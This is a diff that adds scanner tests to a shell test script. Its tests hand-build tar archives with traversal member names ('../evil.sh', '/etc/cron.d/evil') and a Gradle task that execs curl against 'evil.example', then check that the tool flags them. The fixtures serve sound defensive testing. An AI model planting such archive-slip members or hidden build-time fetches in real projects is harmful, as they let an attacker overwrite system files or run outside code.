@@ -7894,6 +7894,43 @@ printf '<?xml version="1.0"?>\n<plist><dict><key>PayloadType</key><string>com.ap
     || check "file: wifi mobileconfig clean" "0" "1"
 rm -rf "$RDIR"
 
+# ─── F39–F40: archive-slip + build-tool exec ───────────────────────────
+TDIR2=$(mktemp -d)
+python3 - "$TDIR2" <<'PYEOF'
+import sys
+def mk(name, payload=b'data'):
+    h = bytearray(512)
+    h[0:len(name)] = name.encode()
+    h[100:108] = b'0000644\0'; h[124:136] = b'00000000010\0'
+    h[148:156] = b'        '; h[156:157] = b'0'; h[257:265] = b'ustar  \0'
+    ck = sum(h); h[148:156] = ('%06o\0 ' % ck).encode()
+    return bytes(h) + payload.ljust(512, b'\0')
+d = sys.argv[1]
+open(d + '/slip.tar','wb').write(mk('../evil.sh') + mk('README'))
+open(d + '/abs.tar','wb').write(mk('/etc/cron.d/evil'))
+open(d + '/ok.tar','wb').write(mk('src/hello.c') + mk('README'))
+PYEOF
+./hlse_core file "$TDIR2/slip.tar" 2>&1 | grep -q "TAR-SLIP" \
+    && check "file: tar ../ member flagged" "0" "0" \
+    || check "file: tar ../ member flagged" "0" "1"
+./hlse_core file "$TDIR2/abs.tar" 2>&1 | grep -q "TAR-SLIP" \
+    && check "file: tar absolute member flagged" "0" "0" \
+    || check "file: tar absolute member flagged" "0" "1"
+./hlse_core file "$TDIR2/ok.tar" 2>&1 | grep -q "TAR-SLIP" \
+    && check "file: plain tar no slip reason" "0" "1" \
+    || check "file: plain tar no slip reason" "0" "0"
+printf 'plugins { id "java" }\ntask x { doLast { exec { commandLine "curl", "evil.example" } } }\n' \
+    > "$TDIR2/evil.gradle"
+./hlse_core file "$TDIR2/evil.gradle" 2>&1 | grep -q "BUILD EXEC" \
+    && check "file: gradle exec+fetch flagged" "0" "0" \
+    || check "file: gradle exec+fetch flagged" "0" "1"
+printf 'plugins { id "java" }\nrepositories { mavenCentral() }\ntask b { doLast { exec { commandLine "javac", "Main.java" } } }\n' \
+    > "$TDIR2/ok.gradle"
+./hlse_core file "$TDIR2/ok.gradle" 2>&1 | grep -q "BUILD EXEC" \
+    && check "file: plain gradle no exec-fetch reason" "0" "1" \
+    || check "file: plain gradle no exec-fetch reason" "0" "0"
+rm -rf "$TDIR2"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
